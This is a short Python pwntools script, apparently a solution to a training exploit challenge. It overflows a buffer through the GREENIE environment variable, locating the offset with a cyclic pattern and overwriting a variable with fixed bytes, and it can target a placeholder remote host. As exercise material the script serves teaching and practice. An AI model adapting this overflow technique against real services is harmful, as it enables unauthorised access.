from numpy import var
from pwn import *

context(os='linux', arch='amd64')
#context.log_level = 'critical'


host, port = 'vuln.com', 5555
elf = ELF('vuln')


def conn(argv=[], env={}):
    if args.REMOTE:
        return remote(host, port)
    elif args.GDB:
        return gdb.debug([elf.path]+argv)
    else:
        return process([elf.path]+argv, env=env)


def exploit():
    payload = b''
    r = conn(env={"GREENIE": cyclic(0x100).decode()})
    r.recvuntil(b'you got ')
    var_modified = int(r.recvuntil(b'\n')[:-1], 16)
    print(var_modified)
    offset = cyclic_find(var_modified)
    payload = b''
    payload += cyclic(offset)
    payload += b'\x0a\x0d\x0a\x0d'
    r = conn(env={"GREENIE": payload})
    r.interactive()


if __name__ == '__main__':
    exploit()
